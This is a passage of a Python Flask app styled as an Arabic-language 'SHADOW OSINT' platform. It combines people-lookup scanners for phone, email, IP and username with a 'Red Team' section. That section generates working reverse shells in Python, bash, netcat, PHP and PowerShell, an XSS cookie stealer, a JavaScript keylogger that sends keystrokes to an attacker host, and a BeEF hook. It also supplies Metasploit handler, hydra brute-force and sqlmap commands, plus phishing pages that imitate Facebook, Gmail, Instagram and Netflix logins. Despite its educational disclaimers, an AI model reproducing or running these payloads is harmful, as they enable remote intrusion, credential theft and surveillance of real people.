            .warning{{background:#fff3cd;color:#856404;padding:10px;border-radius:4px;margin-bottom:15px;font-size:12px}}
        </style></head><body>
        <div class='container'>
            <div class='warning'>⚠️ صفحة تدريب أمني - لا تدخل بيانات حقيقية</div>
            <h1>{service.upper()}</h1>
            <form method='POST' action='/phishing/capture'>
                {''.join(f"<input type='{('password' if f == 'password' else 'text')}' name='{f}' placeholder='{f.title()}' required>" for f in template['fields'])}
                <input type='hidden' name='service' value='{service}'>
                <button type='submit'>تسجيل الدخول</button>
            </form>
        </div></body></html>"""
    
    def capture(self, data):
        """Capture submitted data (educational purposes)"""
        return {
            "service": data.get("service"),
            "timestamp": datetime.now().isoformat(),
            "fields_captured": {k: "***" for k in data if k != "service"},
            "warning": "هذه محاكاة تعليمية - البيانات غير مخزنة"
        }

phishing = PhishingSimulator()

# ==================== أدوات الاختراق الأمنية (Red Team) ====================
class RedTeamTools:
    """أدوات الفريق الأحمر للتدريب الأمني"""
    
    @staticmethod
    def generate_payload(payload_type, lhost, lport):
        """Generate various payload templates"""
        payloads = {
            "python_reverse_shell": f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''',
            "bash_reverse_shell": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "nc_reverse_shell": f"nc -e /bin/sh {lhost} {lport}",
            "php_reverse_shell": f'''<?php $sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3"); ?>''',
            "powershell_reverse_shell": f'''powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"''',
            "xss_stealer": f'''<script>new Image().src="{lhost}/steal?cookie="+document.cookie;</script>''',
            "keylogger_js": f'''<script>document.onkeypress=function(e){{new Image().src="{lhost}/key?k="+String.fromCharCode(e.which);}}</script>''',
            "beef_hook": f'''<script src="{lhost}:3000/hook.js"></script>''',
        }
        return payloads.get(payload_type, "Unknown payload type")
    
    @staticmethod
    def sqlmap_command(target, options=""):
        """Generate sqlmap commands"""
        return f"sqlmap -u '{target}' --batch --random-agent {options}"
    
    @staticmethod
    def nmap_scan(target, scan_type="basic"):
        """Generate nmap commands"""
        scans = {
            "basic": f"nmap {target}",
            "full": f"nmap -sS -sV -O -p- {target}",
            "vuln": f"nmap --script vuln {target}",
            "stealth": f"nmap -sS -Pn -T2 -f {target}",
            "aggressive": f"nmap -A -T4 {target}",
        }
        return scans.get(scan_type, scans["basic"])
    
    @staticmethod
    def hydra_command(target, service, username, wordlist):
        """Generate hydra brute force commands"""
        services = {
            "ssh": f"hydra -l {username} -P {wordlist} ssh://{target}",
            "ftp": f"hydra -l {username} -P {wordlist} ftp://{target}",
            "http": f"hydra -l {username} -P {wordlist} http-post-form://{target}",
        }
        return services.get(service, "")
    
    @staticmethod
    def metasploit_resource(target, lhost, lport):
        """Generate Metasploit resource script"""
        return f"""use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
"""
    
    @staticmethod
    def get_exploit_suggestions(service, version=""):
        """Search exploit-db for known exploits"""
        exploits_db = {
            ("apache", "2.4.49"): [{"id": "CVE-2021-41773", "name": "Apache Path Traversal", "type": "Path Traversal"}],
            ("apache", "2.4.50"): [{"id": "CVE-2021-42013", "name": "Apache Path Traversal", "type": "Path Traversal"}],
            ("openssh", "7.2"): [{"id": "CVE-2016-6210", "name": "SSH User Enumeration", "type": "Information Disclosure"}],
            ("wordpress", ""): [{"id": "CVE-2022-21661", "name": "WP SQL Injection", "type": "SQLi"}],
            ("mysql", ""): [{"id": "CVE-2012-2122", "name": "MySQL Authentication Bypass", "type": "Auth Bypass"}],
            ("tomcat", ""): [{"id": "CVE-2017-12617", "name": "Tomcat RCE", "type": "RCE"}],
            ("struts", ""): [{"id": "CVE-2017-5638", "name": "Struts RCE", "type": "RCE"}],
            ("weblogic", ""): [{"id": "CVE-2017-10271", "name": "WebLogic RCE", "type": "RCE"}],
            ("drupal", ""): [{"id": "CVE-2018-7600", "name": "Drupalgeddon RCE", "type": "RCE"}],
            ("exchange", ""): [{"id": "CVE-2021-26855", "name": "ProxyLogon SSRF", "type": "SSRF"}],
        }
        
        suggestions = []
        for (srv, ver), exploits in exploits_db.items():
            if service.lower() in srv.lower() and (not ver or ver in version):
                suggestions.extend(exploits)
        
        return suggestions if suggestions else [{"id": "N/A", "name": "No known exploits found", "type": "N/A"}]

red_team = RedTeamTools()

# ==================== HTML Template ====================
HTML = r"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 SHADOW OSINT v7.0 - ARMAGEDDON</title>
    <style>
        :root {
            --bg: #0a0a12; --surface: #13131f; --surface2: #1a1a2e;
            --primary: #ff2d55; --primary2: #ff6482; --accent: #00d4ff;
            --text: #e8e8e8; --muted: #888; --border: #252535;
            --green: #00e676; --red: #ff1744; --yellow: #ffd600;
            --orange: #ff9100; --purple: #d500f9; --cyan: #00e5ff;
            --shadow: 0 8px 32px rgba(0,0,0,0.5);
            --glow: 0 0 20px rgba(255,45,85,0.3);
        }
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',Tahoma,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;line-height:1.7}
        
        body::before {
            content:'';position:fixed;top:0;left:0;right:0;bottom:0;
            background:radial-gradient(circle at 20% 30%,rgba(255,45,85,0.04)0%,transparent 50%),
                       radial-gradient(circle at 80% 70%,rgba(0,212,255,0.04)0%,transparent 50%),
                       radial-gradient(circle at 50% 50%,rgba(213,0,249,0.03)0%,transparent 50%);
            z-index:0;pointer-events:none;
        }
        
        .container{max-width:1200px;margin:0 auto;padding:20px;position:relative;z-index:1}
        
        /* Header */
        .header{text-align:center;padding:35px 20px;background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);border-bottom:3px solid var(--primary);position:relative;overflow:hidden}
        .header::after{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,255,255,0.008)2px,rgba(255,255,255,0.008)4px);pointer-events:none}
        .header h1{font-size:3.5em;color:var(--primary);text-shadow:0 0 40px rgba(255,45,85,0.6),0 0 80px rgba(255,45,85,0.3);position:relative;z-index:1;letter-spacing:3px}
        .header .sub{color:var(--muted);margin-top:8px;position:relative;z-index:1;font-size:15px}
        .header .badge-ver{display:inline-block;background:var(--primary);color:#fff;padding:5px 15px;border-radius:20px;font-size:12px;margin-top:10px;position:relative;z-index:1}
        
        /* Nav */
        .nav{display:flex;justify-content:center;gap:4px;padding:12px;flex-wrap:wrap;background:var(--surface);position:sticky;top:0;z-index:1000;border-bottom:1px solid var(--border);box-shadow:var(--shadow)}
        .nav a{padding:10px 16px;background:var(--surface2);color:var(--text);text-decoration:none;border-radius:8px;border:1px solid var(--border);font-size:13px;font-weight:500;transition:all 0.3s;white-space:nowrap}
        .nav a:hover{background:var(--primary);color:#fff;border-color:var(--primary);transform:translateY(-2px);box-shadow:var(--glow)}
        .nav a.active{background:var(--primary);color:#fff;border-color:var(--primary)}
        
        /* Cards */
        .card{background:var(--surface);border:1px solid var(--border);border-radius:16px;padding:30px;margin:25px 0;box-shadow:var(--shadow);transition:all 0.3s}
        .card:hover{border-color:var(--primary);box-shadow:0 12px 40px rgba(255,45,85,0.08)}
        .card h2{color:var(--primary);margin-bottom:20px;font-size:1.5em;display:flex;align-items:center;gap:10px}
        .card h3{color:var(--text);margin:15px 0 10px;font-size:1.1em}
        .card p{color:var(--muted);margin-bottom:15px}
        
        /* Inputs */
        .input-row{display:flex;gap:10px;margin-bottom:15px}
        input,textarea,select{flex:1;padding:14px 18px;background:var(--bg);border:2px solid var(--border);border-radius:10px;color:var(--text);font-size:15px;font-family:inherit;transition:all 0.3s}
        input:focus,textarea:focus,select:focus{outline:none;border-color:var(--primary);box-shadow:0 0 0 4px rgba(255,45,85,0.08)}
        
        /* Buttons */
        .btn{padding:14px 35px;background:var(--primary);color:#fff;border:none;border-radius:10px;cursor:pointer;font-size:15px;font-weight:600;transition:all 0.3s;white-space:nowrap}
        .btn:hover{background:var(--primary2);transform:translateY(-2px);box-shadow:var(--glow)}
        .btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
        .btn-outline{background:transparent;border:2px solid var(--primary);color:var(--primary)}
        .btn-outline:hover{background:var(--primary);color:#fff}
        .btn-danger{background:var(--red)}
        .btn-success{background:var(--green);color:#000}
        .btn-sm{padding:8px 18px;font-size:13px}
        
        /* Result Box */
        .result-box{background:var(--bg);border:2px solid var(--border);border-radius:12px;padding:20px;margin-top:20px;display:none;font-family:'Fira Code',monospace;font-size:13px;white-space:pre-wrap;word-wrap:break-word;max-height:600px;overflow-y:auto;line-height:1.5}
        .result-box.show{display:block}
        .result-box.success{border-color:var(--green)}
        .result-box.error{border-color:var(--red)}
        
        /* Loading */
        .loading{text-align:center;padding:20px;display:none}
        .loading.show{display:block}
        .spinner{width:50px;height:50px;border:3px solid var(--border);border-top:3px solid var(--primary);border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 15px}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        
        /* Badges */
        .badge{display:inline-block;padding:5px 12px;border-radius:6px;font-weight:600;font-size:12px;margin:3px}
        .bg-success{background:var(--green);color:#000}
        .bg-danger{background:var(--red);color:#fff}
        .bg-warning{background:var(--yellow);color:#000}
        .bg-info{background:var(--accent);color:#000}
        .bg-purple{background:var(--purple);color:#fff}
        .bg-critical{background:#b71c1c;color:#fff;font-size:14px;padding:8px 16px}
        
        /* Tables */
        table{width:100%;border-collapse:collapse;margin:15px 0}
        th,td{padding:12px 15px;border:1px solid var(--border);text-align:right;font-size:13px}
        th{background:var(--surface2);color:var(--primary);font-weight:600;text-transform:uppercase}
        td{background:var(--bg)}
        tr:hover td{background:#1a1a25}
        
        /* Stats Grid */
        .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:15px;margin:20px 0}
        .stat-card{background:var(--surface2);border:1px solid var(--border);border-radius:12px;padding:25px;text-align:center;transition:all 0.3s}
        .stat-card:hover{border-color:var(--primary);transform:translateY(-3px)}
        .stat-card .value{font-size:2.5em;font-weight:bold;color:var(--primary)}
        .stat-card .label{color:var(--muted);font-size:0.85em;text-transform:uppercase;letter-spacing:1px}
        
        /* Code */
        code{background:#1a1a1a;padding:2px 8px;border-radius:4px;color:var(--primary);font-family:'Fira Code',monospace;font-size:13px}
        pre{background:var(--bg);padding:15px;border-radius:10px;overflow-x:auto;border:1px solid var(--border)}
        
        /* Footer */
        .footer{text-align:center;padding:25px;color:var(--muted);border-top:1px solid var(--border);margin-top:40px;font-size:13px}
        
        /* Grid layouts */
        .grid-2{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:10px}
        .platform-item{background:var(--surface2);padding:8px 12px;border-radius:6px;border:1px solid var(--border);font-size:13px}
        
        @media(max-width:768px){
            .header h1{font-size:2em}
            .input-row{flex-direction:column}
            .nav{flex-direction:column}
            .nav a{text-align:center}
            .stats-grid{grid-template-columns:1fr 1fr}
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 SHADOW OSINT</h1>
        <p class="sub">منصة الاستخبارات والفحص الأمني المتكاملة | Red Team + OSINT + Pentest</p>
        <span class="badge-ver">v7.0 ARMAGEDDON</span>
    </div>
    
    <div class="nav">
        <a href="/" class="{{active_phone}}">📱 هاتف</a>
        <a href="/email" class="{{active_email}}">📧 بريد</a>
        <a href="/ip" class="{{active_ip}}">🌐 IP</a>
        <a href="/url" class="{{active_url}}">🔗 رابط</a>
        <a href="/username" class="{{active_user}}">👤 يوزر</a>
        <a href="/redteam" class="{{active_red}}">💀 Red Team</a>
        <a href="/phishing" class="{{active_phish}}">🎣 محاكي</a>
        <a href="/api" class="{{active_api}}">⚡ API</a>
        <a href="/stats" class="{{active_stats}}">📊 إحصائيات</a>
    </div>
    
    <div class="container">{{content|safe}}</div>
    
    <div class="footer">
        <p>⚠️ <strong>تحذير:</strong> هذه المنصة للأغراض التعليمية والبحثية والتدريب الأمني فقط. استخدام أي أداة ضد أنظمة دون إذن خطي مسبق جريمة يعاقب عليها القانون.</p>
        <p>SHADOW OSINT v7.0 ARMAGEDDON | Red Team + OSINT + Pentest | المستخدم مسؤول قانونياً</p>
    </div>
    
    <script>
        async function scan(type) {
            const input = document.getElementById(type + '-input');
            const loading = document.getElementById(type + '-loading');
            const result = document.getElementById(type + '-result');
            
            if (!input || !input.value.trim()) {
                alert('الرجاء إدخال ' + getLabel(type));
                return;
            }
            
            loading.classList.add('show');
            result.classList.remove('show', 'success', 'error');
            result.innerHTML = '';
            
            try {
                const body = {};
                body[type] = input.value.trim();
                
                const resp = await fetch('/api/scan/' + type, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(body)
                });
                
                const data = await resp.json();
                
                if (resp.ok) {
                    result.innerHTML = formatResult(type, data);
                    result.classList.add('success');
                } else {
                    result.innerHTML = '<div style="color:#ff1744;padding:20px;">❌ ' + (data.error || 'خطأ') + '</div>';
                    result.classList.add('error');
                }
                result.classList.add('show');
                result.scrollIntoView({behavior:'smooth'});
            } catch(e) {
                result.innerHTML = '<div style="color:#ff1744;padding:20px;">❌ ' + e.message + '</div>';
                result.classList.add('error', 'show');
            } finally {
                loading.classList.remove('show');
            }
        }
        
        function getLabel(type) {
            const m = {phone:'رقم الهاتف',email:'البريد',ip:'IP',url:'الرابط',username:'اسم المستخدم'};
            return m[type] || '';
        }
        
        function badge(val, t, f) {
            if (val === true) return '<span class="badge bg-success">✅ '+t+'</span>';
            if (val === false) return '<span class="badge bg-danger">❌ '+f+'</span>';
            return '<span class="badge bg-warning">⚠️ ؟</span>';
        }
        
        function formatResult(type, data) {
            let h = '';
            
            if (type === 'phone') {
                h += '<h3 style="color:#ff2d55">📱 '+data.phone+'</h3>';
                const p = data.platforms || {};
                h += '<div class="grid-2">';
                for (const [name, info] of Object.entries(p)) {
                    const exists = info && (info.exists || info.linked || info.found);
                    h += '<div class="platform-item">'+name+': '+badge(exists,'موجود','غير موجود')+'</div>';
                }
                h += '</div>';
                
                if (p.truecaller && p.truecaller.name) {
                    h += '<br><strong>👤 Truecaller:</strong> <span style="color:#d500f9;font-size:16px">'+p.truecaller.name+'</span>';
                }
                if (p.carrier && !p.carrier.error) {
                    h += '<br><br><strong>📶 الشبكة:</strong> '+(p.carrier.carrier||'?')+' | '+p.carrier.country+' | '+p.carrier.type;
                }
            }
            
            else if (type === 'ip') {
                h += '<h3 style="color:#ff2d55">🌐 '+data.ip+'</h3>';
                const geo = data.geoip || {};
                if (geo.country) h += '<strong>📍</strong> '+(geo.city||'')+', '+geo.country+'<br>';
                
                const abuse = data.abuseipdb || {};
                if (abuse.score !== undefined) {
                    h += '<strong>⚠️ AbuseIPDB:</strong> <span class="badge '+(abuse.score>50?'bg-danger':'bg-success')+'">'+abuse.score+'%</span> ('+abuse.reports+' بلاغ)<br>';
                }
                
                const ports = data.ports || {};
                if (ports.open && ports.open.length > 0) {
                    h += '<strong>🔓 منافذ:</strong> ';
                    ports.open.forEach(p => { h += '<span class="badge bg-warning">'+p.port+'</span> '; });
                } else h += '<strong>🔒</strong> لا منافذ مفتوحة';
                
                if (data.dns) h += '<br><strong>DNS:</strong> '+data.dns;
            }
            
            else if (type === 'url') {
                h += '<h3 style="color:#ff2d55">🔗 '+data.url+'</h3>';
                
                const vulns = data.vulnerabilities || [];
                if (vulns.length > 0) {
                    h += '<strong>⚠️ ثغرات ('+vulns.length+'):</strong><br>';
                    vulns.forEach(v => {
                        h += '<div style="margin:5px 0;padding:8px;background:#1a1a25;border-radius:6px">';
                        h += '<span class="badge bg-critical">'+v.severity+'</span> ';
                        h += '<strong>'+v.type+'</strong>: '+v.description;
                        h += '</div>';
                    });
                }
                
                const ssl = data.ssl || {};
                if (ssl.days_left !== undefined) {
                    h += '<br><strong>🔒 SSL:</strong> '+(ssl.days_left||'?')+' يوم - <span class="badge '+(ssl.days_left>30?'bg-success':'bg-danger')+'">'+(ssl.expired?'منتهي':'ساري')+'</span>';
                }
                
                const vt = data.virustotal || {};
                if (vt.malicious !== undefined) {
                    h += '<br><strong>🦠 VirusTotal:</strong> ضار:'+vt.malicious+' مشبوه:'+vt.suspicious+' آمن:'+vt.harmless;
                }
                
                if (data.technology) {
                    h += '<br><strong>🔧:</strong> ';
                    data.technology.forEach(t => { h += '<span class="badge bg-info">'+t.name+'</span> '; });
                }
            }
            
            else if (type === 'email') {
                h += '<h3 style="color:#ff2d55">📧 '+data.email+'</h3>';
                h += badge(data.valid_format,'صيغة صحيحة','صيغة خاطئة')+' ';
                h += badge(!data.disposable,'بريد حقيقي','بريد مؤقت')+' ';
                h += badge(data.mx_valid,'MX صالح','MX غير صالح');
                
                if (data.breaches && data.breaches.length > 0) {
                    h += '<br><br><strong>⚠️ تسريبات ('+data.breaches.length+'):</strong><br>';
                    data.breaches.forEach(b => {
                        h += '<span class="badge bg-danger">'+b.name+' ('+b.date+')</span> ';
                    });
                }
            }
            
            else if (type === 'username') {
                h += '<h3 style="color:#ff2d55">👤 @'+data.username+'</h3>';
                h += '<strong>موجود في '+data.found_count+'/'+data.total_checked+' منصة</strong><br><br>';
                h += '<div class="grid-2">';
                for (const [name, found] of Object.entries(data.platforms)) {
                    h += '<div class="platform-item">'+name+': '+badge(found,'✅','❌')+'</div>';
                }
                h += '</div>';
            }
            
            return h;
        }
        
        document.addEventListener('keypress', e => {
            if (e.key === 'Enter') {
                const a = document.activeElement;
                if (a && a.id && a.id.endsWith('-input')) scan(a.id.replace('-input',''));
            }
        });
        
        async function loadPayloads() {
            try {
                const r = await fetch('/api/payloads');
                const data = await r.json();
                const sel = document.getElementById('payload-select');
                if (sel) {
                    sel.innerHTML = '<option value="">اختر...</option>';
                    data.forEach(p => {
                        sel.innerHTML += '<option value="'+p.id+'">'+p.category+' - '+p.name+' ('+p.risk_level+')</option>';
                    });
                }
            } catch(e) {}
        }
        
        async function generatePayload() {
            const type = document.getElementById('payload-type').value;
            const lhost = document.getElementById('lhost').value || 'LHOST';
            const lport = document.getElementById('lport').value || '4444';
            const res = document.getElementById('payload-result');
            
            try {
                const r = await fetch('/api/redteam/payload', {
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({type,lhost,lport})
                });
                const d = await r.json();
                res.innerHTML = '<pre style="background:#0a0a0a;padding:15px;border-radius:8px"><code>'+d.payload+'</code></pre>';
                res.classList.add('show');
            } catch(e) {
                res.innerHTML = 'خطأ: '+e.message;
                res.classList.add('show');
            }
        }
    </script>
</body>
</html>"""

# ==================== الصفحات ====================
def render(page, content):
    active = {p:("active" if p==page else "") for p in ["active_phone","active_email","active_ip","active_url","active_user","active_red","active_phish","active_api","active_stats"]}
    html = HTML
    for k, v in active.items():
        html = html.replace("{{"+k+"}}", v)
    return html.replace("{{content|safe}}", content)

PHONE_PAGE = """
<div class="card"><h2>📱 فحص رقم الهاتف الشامل</h2><p>واتساب، تيليجرام، فيسبوك، انستجرام، سناب، تويتر، فايبر، سيجنال، تروكولر، الشبكة، التسريبات...</p>
<div class="input-row"><input id="phone-input" placeholder="+201234567890" value="+20" autofocus><button class="btn" onclick="scan('phone')">🔍 فحص شامل</button></div>
<div class="loading" id="phone-loading"><div class="spinner"></div><p>جاري الفحص الشامل... 30-60 ثانية</p></div>
<div class="result-box" id="phone-result"></div></div>
"""

EMAIL_PAGE = """
<div class="card"><h2>📧 فحص البريد الإلكتروني</h2><p>التحقق من الصحة، البريد المؤقت، MX، SMTP، التسريبات، Gravatar...</p>
<div class="input-row"><input id="email-input" placeholder="user@example.com" autofocus><button class="btn" onclick="scan('email')">🔍 فحص</button></div>
<div class="loading" id="email-loading"><div class="spinner"></div></div>
<div class="result-box" id="email-result"></div></div>
"""

IP_PAGE = """
<div class="card"><h2>🌐 فحص IP متقدم</h2><p>الموقع، ISP، السمعة، Shodan، المنافذ، DNS، VPN، TOR، القوائم السوداء...</p>
<div class="input-row"><input id="ip-input" placeholder="8.8.8.8" autofocus><button class="btn" onclick="scan('ip')">🔍 فحص</button></div>
<div class="loading" id="ip-loading"><div class="spinner"></div></div>
<div class="result-box" id="ip-result"></div></div>
"""

URL_PAGE = """
<div class="card"><h2>🔗 فحص رابط + ثغرات</h2><p>SSL، رؤوس الأمان، VirusTotal، التقنيات، الثغرات (XSS, SQLi, LFI)، الملفات المكشوفة...</p>
<div class="input-row"><input id="url-input" placeholder="https://example.com" autofocus><button class="btn" onclick="scan('url')">🔍 فحص شامل</button></div>
<div class="loading" id="url-loading"><div class="spinner"></div></div>
<div class="result-box" id="url-result"></div></div>
"""

USERNAME_PAGE = """
<div class="card"><h2>👤 فحص اسم المستخدم</h2><p>البحث في 37+ منصة اجتماعية وتقنية...</p>
<div class="input-row"><input id="username-input" placeholder="username" autofocus><button class="btn" onclick="scan('username')">🔍 بحث</button></div>
<div class="loading" id="username-loading"><div class="spinner"></div></div>
<div class="result-box" id="username-result"></div></div>
"""

REDTEAM_PAGE = """
<div class="card"><h2>💀 Red Team Tools</h2><p>أدوات الفريق الأحمر للتدريب الأمني</p>

<h3>🔨 توليد Payloads</h3>
<div class="input-row">
    <select id="payload-type">
        <option value="python_reverse_shell">Python Reverse Shell</option>
        <option value="bash_reverse_shell">Bash Reverse Shell</option>
        <option value="nc_reverse_shell">Netcat Reverse Shell</option>
        <option value="php_reverse_shell">PHP Reverse Shell</option>
        <option value="powershell_reverse_shell">PowerShell Reverse Shell</option>
        <option value="xss_stealer">XSS Cookie Stealer</option>
        <option value="keylogger_js">JavaScript Keylogger</option>
        <option value="beef_hook">BeEF Hook</option>
    </select>
    <input id="lhost" placeholder="LHOST (IP)">
    <input id="lport" placeholder="LPORT (4444)">
    <button class="btn" onclick="generatePayload()">توليد</button>
</div>
<div class="result-box" id="payload-result"></div>

<h3>🔍 Nmap Commands</h3>
<pre><code>nmap -sS -sV -O -p- TARGET    # Full scan
nmap --script vuln TARGET       # Vulnerability scan
nmap -sS -Pn -T2 -f TARGET     # Stealth scan</code></pre>

<h3>💉 SQLMap</h3>
<pre><code>sqlmap -u 'TARGET' --batch --random-agent --dbs</code></pre>

<h3>🔨 Hydra (Brute Force)</h3>
<pre><code>hydra -l USER -P wordlist.txt ssh://TARGET
hydra -l USER -P wordlist.txt ftp://TARGET</code></pre>

<h3>📡 Metasploit Resource Script</h3>
<pre><code>use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST IP
set LPORT PORT
exploit -j -z</code></pre>
</div>
"""

PHISHING_PAGE = """
<div class="card"><h2>🎣 محاكي التصيد التعليمي</h2><p>صفحات تدريب أمني لمحاكاة هجمات التصيد - لا تخزن بيانات حقيقية</p>

<h3>اختر الخدمة للمحاكاة:</h3>
<div style="display:flex;gap:10px;flex-wrap:wrap">
    <a href="/phishing/facebook" class="btn btn-outline">Facebook</a>
    <a href="/phishing/instagram" class="btn btn-outline">Instagram</a>
    <a href="/phishing/gmail" class="btn btn-outline">Gmail</a>
    <a href="/phishing/netflix" class="btn btn-outline">Netflix</a>
</div>
</div>
"""

API_PAGE = """
<div class="card"><h2>⚡ API</h2>
<h3>📱 فحص هاتف</h3><pre><code>POST /api/scan/phone\n{"phone": "+2012..."}</code></pre>
<h3>📧 فحص بريد</h3><pre><code>POST /api/scan/email\n{"email": "user@domain.com"}</code></pre>
<h3>🌐 فحص IP</h3><pre><code>POST /api/scan/ip\n{"ip": "8.8.8.8"}</code></pre>
<h3>🔗 فحص رابط</h3><pre><code>POST /api/scan/url\n{"url": "https://..."}</code></pre>
<h3>👤 فحص يوزر</h3><pre><code>POST /api/scan/username\n{"username": "user"}</code></pre>
<h3>💀 Red Team</h3><pre><code>POST /api/redteam/payload\n{"type":"python_reverse_shell","lhost":"IP","lport":"4444"}</code></pre>
<h3>📊 إحصائيات</h3><pre><code>GET /api/stats</code></pre>
</div>
"""

# ==================== Routes ====================
@web_app.route('/')
def home():
    return render('phone', PHONE_PAGE)

@web_app.route('/email')
def email_pg():
    return render('email', EMAIL_PAGE)

@web_app.route('/ip')
def ip_pg():
    return render('ip', IP_PAGE)

@web_app.route('/url')
def url_pg():
    return render('url', URL_PAGE)

@web_app.route('/username')
def username_pg():
    return render('username', USERNAME_PAGE)

@web_app.route('/redteam')
def redteam_pg():
    return render('red', REDTEAM_PAGE)

@web_app.route('/phishing')
def phishing_pg():
    return render('phish', PHISHING_PAGE)

@web_app.route('/api')
def api_pg():
    return render('api', API_PAGE)

@web_app.route('/stats')
def stats_pg():
    total = db_query("SELECT COUNT(*) as c FROM scans", fetch=True)[0]['c']
    vulns = db_query("SELECT COUNT(*) as c FROM vulnerabilities", fetch=True)[0]['c']
    content = f"""
    <div class="card"><h2>📊 إحصائيات</h2>
    <div class="stats-grid">
        <div class="stat-card"><div class="value">{total}</div><div class="label">فحوصات</div></div>
        <div class="stat-card"><div class="value">{vulns}</div><div class="label">ثغرات مكتشفة</div></div>
    </div></div>"""
    return render('stats', content)

# ==================== API Routes ====================
@web_app.route('/api/scan/<scan_type>', methods=['POST'])
def api_scan(scan_type):
    try:
        data = request.get_json() or {}
        target = data.get(scan_type, '')
        if not target:
            return jsonify({"error": "Missing target"}), 400
        
        scanners = {
            'phone': phone_intel.scan,
            'ip': ip_intel.scan,
            'url': vuln_scanner.scan_url,
            'email': email_intel.scan,
            'username': username_intel.scan
        }
        
        if scan_type not in scanners:
            return jsonify({"error": "Unknown scan type"}), 400
        
        result = scanners[scan_type](target)
        db_insert("scans", {"target": target, "scan_type": scan_type, "result": json.dumps(result, ensure_ascii=False), "ip": request.remote_addr or ""})
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@web_app.route('/api/redteam/payload', methods=['POST'])
def api_payload():
    data = request.get_json() or {}
    payload_type = data.get('type', 'python_reverse_shell')
    lhost = data.get('lhost', 'LHOST')
    lport = data.get('lport', '4444')
    
    payload = RedTeamTools.generate_payload(payload_type, lhost, lport)
    return jsonify({"payload": payload, "type": payload_type, "lhost": lhost, "lport": lport})

@web_app.route('/api/payloads')
def api_payloads():
    return jsonify(db_query("SELECT * FROM payloads", fetch=True))

@web_app.route('/api/stats')
def api_stats():
    total = db_query("SELECT COUNT(*) as c FROM scans", fetch=True)[0]['c']
    return jsonify({"total_scans": total, "version": "7.0.0", "codename": "ARMAGEDDON"})

@web_app.route('/health')
def health():
    return jsonify({"status": "healthy", "version": "7.0.0"})

# ==================== Phishing Simulator Routes ====================
@web_app.route('/phishing/<service>')
def phishing_service(service):
    if service in PhishingSimulator.TEMPLATES:
        return phishing.generate_page(service)
    return "Service not found", 404

@web_app.route('/phishing/capture', methods=['POST'])
def phishing_capture():
    data = request.form.to_dict()
    result = phishing.capture(data)
    return jsonify(result)

# ==================== Error Handlers ====================
@web_app.errorhandler(404)
def e404(e):
    return jsonify({"error": "Not found"}), 404

@web_app.errorhandler(500)
def e500(e):
    return jsonify({"error": "Internal error"}), 500

# ==================== Run ====================
if __name__ == '__main__':
    init_db()
    print("""
╔══════════════════════════════════════════════════════════════════╗
║        🔥 SHADOW OSINT v7.0 - ARMAGEDDON 🔥                    ║
║    OSINT + Red Team + Pentest + Phishing Simulator              ║
║    المستخدم يتحمل المسؤولية القانونية الكاملة                     ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    print(f"🚀 http://0.0.0.0:{PORT}")
    web_app.run(host='0.0.0.0', port=PORT, debug=False)
